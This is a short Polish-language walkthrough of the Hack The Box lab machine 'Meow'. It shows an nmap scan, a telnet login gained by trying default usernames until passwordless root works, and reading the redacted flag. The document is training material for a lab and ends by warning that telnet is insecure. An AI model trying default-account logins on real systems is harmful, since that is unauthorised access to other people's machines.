# 🐾 HTB: Meow

## 📌 Informacje ogólne

- **Nazwa maszyny:** Meow  
- **Poziom trudności:** Very Easy  
- **Cel:** Uzyskać dostęp do maszyny i odczytać flagę użytkownika (`flag.txt`)

---

## 🌐 Krok 1 – Rekonesans

```bash
nmap -sV nmap 10.129.XXX.XXX
```

**Wynik:**
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

---

## 📞 Krok 2 – Łączenie się przez Telnet

```bash
telnet 10.129.XXX.XXX
```

Po połączeniu próbujemy domyślnych użytkowników, którzy mogą nie wymagać hasła, np.:

- `admin`
- `administrator`
- `root` ✅

Zadziałało konto `root`.

---

## 🏁 Krok 3 – Znalezienie flagi

Po zalogowaniu:

```bash
ls
cat flag.txt
```

**Flaga:**

```
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

---

## 📓 Notatki dodatkowe

- Telnet to **niezaszyfrowany i niebezpieczny protokół**, który nie powinien być używany w systemach produkcyjnych.
- Celem tej maszyny jest **zapoznanie się z interfejsem HTB i sposobem zdobywania flag**.

---

## ✅ Podsumowanie

- ✅ Wykonano skanowanie portów (`nmap`)
- ✅ Wykryto usługę `telnet`
- ✅ Zalogowano się bez hasła
- ✅ Odczytano flagę z `flag.txt`
